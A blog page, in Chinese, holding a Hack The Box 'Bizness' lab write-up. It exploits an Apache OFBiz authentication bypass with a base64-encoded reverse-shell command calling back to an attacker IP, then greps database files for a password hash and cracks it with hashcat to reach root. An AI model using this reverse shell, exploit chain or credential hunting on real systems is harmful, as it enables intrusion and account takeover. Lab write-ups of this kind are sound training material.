@@ -1,0 +1,335 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  
+  <title>HTB-bizness-wp | Antel0p3&#39;s blog</title>
+  <meta name="author" content="John Doe">
+  
+  <meta name="description" content="信息收集nmap 扫描  常规开放端口22, 80, 443
+dirsearch 后收集到一些路由/content, /accounting, /control  但都会跳转到登录界面
+
+从右下角可以看到用的框架是 Apache OFBiz. Release 18.12  
+搜索可以发现(CVE-2">
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="HTB-bizness-wp"/>
+  <meta property="og:site_name" content="Antel0p3&#39;s blog"/>
+
+  
+    <meta property="og:image" content=""/>
+  
+
+  
+    <link rel="alternative" href="/atom.xml" title="Antel0p3&#39;s blog" type="application/atom+xml">
+  
+  
+    <link href="/favicon.png" rel="icon">
+  
+  
+  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/prism.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+
+  <script src="/js/jquery-2.0.3.min.js"></script>
+
+  <!-- analytics -->
+  
+  <!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-70812759-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-70812759-1');
+</script>
+
+
+
+
+
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+    <div class="container">
+      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+		<span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+	  <a class="navbar-brand" href="/">Antel0p3&#39;s blog</a>
+      <div class="collapse navbar-collapse nav-menu">
+		<ul class="nav navbar-nav">
+		  
+		  <li>
+			<a href="/archives" title="All the articles.">
+			  <i class="fa fa-archive"></i>Archives
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/categories" title="All the categories.">
+			  <i class="fa fa-folder"></i>Categories
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/tags" title="All the tags.">
+			  <i class="fa fa-tags"></i>Tags
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/about" title="About me.">
+			  <i class="fa fa-user"></i>About
+			</a>
+		  </li>
+		  
+		</ul>
+      </div>
+    </div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
+
+  <div class="container">
+  	<div class="content">
+    	 
+
+
+					
+							<div class="page-header">
+								<h1>
+									
+											
+												HTB-bizness-wp
+									
+									
+								</h1>
+								
+									<p id="/2024/01/11/HTB-bizness-wp/" class="leancloud-visitors view"
+										data-flag-title="HTB-bizness-wp">
+										<i class="fa fa-eye"></i> <i class="leancloud-visitors-count"></i>
+									</p>
+									
+							</div>
+							
+								
+
+<div class="row post">
+	<!-- cols -->
+	
+	<div id="top_meta">
+		
+	</div>
+	<div class="col-md-9">
+	
+
+	<!-- content -->
+	<div class="mypage">		
+	  		
+
+	  <h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>nmap 扫描  常规开放端口22, 80, 443</p>
+<p>dirsearch 后收集到一些路由<code>/content</code>, <code>/accounting</code>, <code>/control</code>  但都会跳转到登录界面</p>
+<p><img src="https://github.com/Antel0p3/Antel0p3.github.io/blob/main/2024/01/11/HTB-bizness-wp/0x1.png?raw=true" alt="img"></p>
+<p>从右下角可以看到用的框架是 <code>Apache OFBiz. Release 18.12</code>  </p>
+<p>搜索可以发现<code>(CVE-2023-49070 and CVE-2023-51467)</code>  </p>
+<p>以及攻击利用的payload <a target="_blank" rel="noopener" href="https://github.com/jakabakos/Apache-OFBiz-Authentication-Bypass/blob/master/exploit.py">https://github.com/jakabakos/Apache-OFBiz-Authentication-Bypass/blob/master/exploit.py</a></p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>下载<a target="_blank" rel="noopener" href="https://github.com/jakabakos/Apache-OFBiz-Authentication-Bypass/blob/master/exploit.py%E5%92%8Chttps://github.com/frohoff/ysoserial/releases/download/v0.0.6/ysoserial-all.jar">https://github.com/jakabakos/Apache-OFBiz-Authentication-Bypass/blob/master/exploit.py和https://github.com/frohoff/ysoserial/releases/download/v0.0.6/ysoserial-all.jar</a> 之后  执行命令</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python3 exploit.py --url https://bizness.htb/ --cmd <span class="string">&#x27;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMjQvOTExMSAwPiYxCg==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 这里的YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMjQvOTExMSAwPiYxCg==为&#x27;bash -i &gt;&amp; /dev/tcp/10.10.14.124/9111 0&gt;&amp;1&#x27;的base64编码</span></span><br><span class="line"><span class="comment"># 另外开一个terminal nc -lvnp 9111</span></span><br></pre></td></tr></table></figure>
+
+<p>即可获得反弹shell</p>
+<h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><p>下载linpeas.sh  执行后发现有derby  筛选所有相关的dat文件内容 <code>find / -name &quot;*.dat&quot;</code> 进入到目录<code>/opt/ofbiz/runtime/data/derby/ofbiz/seg0</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep -arion -E <span class="string">&#x27;(\w+\W+)&#123;0,5&#125;password(\W+\w+)&#123;0,5&#125;&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>可以得到一个可疑哈希  <code>$SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I</code></p>
+<p>这里为SHA1哈希 且salt为d  , _换成&#x2F;, -换成+</p>
+<p>用cyberchef从base64转到hex得到 <code>b8fd3f41a541a435857a8f3e751cc3a91c174362</code> </p>
+<p>接着用hashcat爆破  hash文件内容：<code>b8fd3f41a541a435857a8f3e751cc3a91c174362:d</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m 120 -a 0 <span class="built_in">hash</span> /usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure>
+
+<p>得到结果  密码即为monkeybizness</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">b8fd3f41a541a435857a8f3e751cc3a91c174362:d:monkeybizness  </span><br><span class="line">                                                          </span><br><span class="line">Session..........: hashcat</span><br><span class="line">Status...........: Cracked</span><br><span class="line">Hash.Mode........: 120 (sha1(<span class="variable">$salt</span>.<span class="variable">$pass</span>))</span><br><span class="line">Hash.Target......: b8fd3f41a541a435857a8f3e751cc3a91c174362:d</span><br><span class="line">Time.Started.....: Thu Jan 11 23:10:55 2024 (13 secs)</span><br><span class="line">Time.Estimated...: Thu Jan 11 23:11:08 2024 (0 secs)</span><br><span class="line">Kernel.Feature...: Pure Kernel</span><br><span class="line">Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)</span><br><span class="line">Guess.Queue......: 1/1 (100.00%)</span><br><span class="line">Speed.<span class="comment">#1.........:  3346.2 kH/s (0.09ms) @ Accel:512 Loops:1 Thr:1 Vec:8</span></span><br><span class="line">Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)</span><br><span class="line">Progress.........: 1478656/14344385 (10.31%)</span><br><span class="line">Rejected.........: 0/1478656 (0.00%)</span><br><span class="line">Restore.Point....: 1477632/14344385 (10.30%)</span><br><span class="line">Restore.Sub.<span class="comment">#1...: Salt:0 Amplifier:0-1 Iteration:0-1</span></span><br><span class="line">Candidate.Engine.: Device Generator</span><br><span class="line">Candidates.<span class="comment">#1....: montano13 -&gt; monkey-moo</span></span><br><span class="line">Hardware.Mon.<span class="comment">#1..: Util: 43%</span></span><br></pre></td></tr></table></figure>
+
+<p>su切换为root 密码输入monkeybizness 成功提权 </p>
+
+	  <div class="article-footer-copyright">
+
+    本博客采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议(CC BY-NC-SA 4.0) 发布.</a>
+</div>
+
+	</div>
+
+	<!-- 
+		<span id="/2024/01/11/HTB-bizness-wp/" class="leancloud-visitors view" data-flag-title="HTB-bizness-wp">
+			<i class="fa fa-eye"></i> <i class="leancloud-visitors-count"></i>
+		</span>
+	 -->
+	
+	<div>
+  	<center>
+
+	<div class="pagination">
+
+    
+    
+    <a type="button" class="btn btn-default disabled"><i class="fa fa-arrow-circle-o-left"></i>Prev</a>
+    
+
+    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
+    
+    <a href="/2024/01/10/node反序列化RCE/" type="button" class="btn btn-default ">Next<i
+                class="fa fa-arrow-circle-o-right"></i></a>
+    
+
+    
+</div>
+
+
+    </center>
+	</div>
+	
+	<!-- comment -->
+	<!--
+<section id="comment">
+    <h2 class="title">Comments</h2>
+
+    
+</section>
+
+-->
+	
+		<section id="comments" class="comments">
+			<style>
+			.comments{margin:30px;padding:10px;background:rgb(0, 0, 0)}
+			@media screen and (max-width:800px){.comments{margin:auto;padding:10px;background:#000}}
+			</style>
+			<div id="vcomment" class="comment"></div>
+<script src='//unpkg.com/valine/dist/Valine.min.js'></script>
+<script src="https://cdnjs.loli.net/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+<script>
+var valineConfig = {"enable":true,"appId":"7m4bFydh606FgGbxRPsI8M6l-gzGzoHsz","appKey":"edXvAXhOXIvksZqtq8b5AXWj","placeholder":"input your comment: ","visitor":true,"avatar":"retro","lang":"en","metaPlaceholder":{"nick":"nick","mail":"mail","link":"link"},"requiredFields":["nick","mail","link"],"pageView":true}
+valineConfig.el='#vcomment';
+new Valine(valineConfig);
+    // new Valine({
+    //     el: '#vcomment',
+    //     appId: "",
+    //     appKey: "",
+    //     placeholder: "input your comment: ",
+    //     avatar:"retro",
+    //     visitor: "true",
+    //     requiredFields: "nick,mail,link".split(','),
+    // });
+</script>
+
+		</section>
+	
+	
+	
+	</div> <!-- col-md-9/col-md-12 -->
+
+
+	
+	<div id="side_meta">
+		<div class="col-md-3" id="post_meta"> 
+
+	<!-- date -->
+	
+	<div class="meta-widget">
+	<i class="fa fa-clock-o"></i>
+	2024-01-11 
+	</div>
+	
+
+	<!-- categories -->
+    
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#categorys"><i class="fa fa-folder"></i></a>	
+    <ul id="categorys" class="tag_box list-unstyled collapse in">
+          
+  <li>
+    <li><a href="/categories/web-wp/">web-wp<span>54</span></a></li>
+  </li>
+
+    </ul>
+	</div>
+	
+
+	<!-- tags -->
+	
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#tags"><i class="fa fa-tags"></i></a>		  
+    <ul id="tags" class="tag_box list-unstyled collapse in">	  
+	    
+  <li><a href="/tags/web/">web<span>67</span></a></li> <li><a href="/tags/Hack-The-Box/">Hack The Box<span>1</span></a></li>
+    </ul>
+	</div>
+		
+
+	<!-- toc -->
+	<div class="meta-widget">
+	
+	</div>
+	
+    <hr>
+	
+</div><!-- col-md-3 -->
+
+		
+
+	</div>
+	
+		
+
+</div><!-- row -->
+
+<!--
+ -->
+
+
+
+	</div>
+  </div>
+  <div class="container-narrow">
+  <footer>  </footer>
+</div> <!-- container-narrow -->
+  
+
+
+  
+<a id="gotop" href="#">   
+  <span>⬆︎TOP</span>
+</a>
+
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/search.js"></script> 
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+</body>
+   </html>
